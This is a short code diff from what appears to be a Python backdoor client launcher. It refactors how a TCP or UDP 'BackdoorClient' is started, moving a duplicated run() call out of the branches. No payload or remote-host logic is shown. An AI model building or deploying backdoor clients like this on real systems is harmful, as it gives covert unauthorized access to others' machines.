@@ -55,11 +55,11 @@ def main():
         if args.protocol == "tcp":
             client = backdoor.TcpBackdoorClient(key, pw, args.lport, args.dport, args.server)
             print("starting the TCP Client")
-            client.run()
         else:
             client = backdoor.UdpBackdoorClient(key, pw, args.lport, args.dport, args.server)
             print("starting the UDP Client")
-            client.run()
+
+        client.run()
         client.connect()
 
 
